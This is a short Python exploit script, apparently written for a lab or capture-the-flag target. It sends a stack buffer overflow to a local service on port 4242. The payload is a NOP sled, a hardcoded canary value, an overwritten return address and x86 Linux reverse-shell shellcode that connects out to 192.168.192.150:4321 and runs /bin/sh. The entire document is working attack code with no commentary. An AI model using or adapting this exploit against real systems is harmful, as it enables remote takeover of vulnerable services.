import socket
import time

buf = ''
shellcode = ''
stack = ''
payload = ''

canary = '\xe4\xff\xff\xe4' + '\x44\x44\x44\x44'

for i in range(1,104):
	buf = buf + '\x90'

shellcode = '\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59' + \
            '\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\xc0\x96\x66\x68' + \
            '\x10\xe1\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd' + \
            '\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53' + \
            '\x89\xe1\xb0\x0b\xcd\x80'

eip = '\xb6\x93\x04\x08'

payload = buf + canary + eip + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 4242))
time.sleep(1)
s.send('X\n')
time.sleep(5)
s.sendall(payload)
s.shutdown(socket.SHUT_RDWR)
s.close()

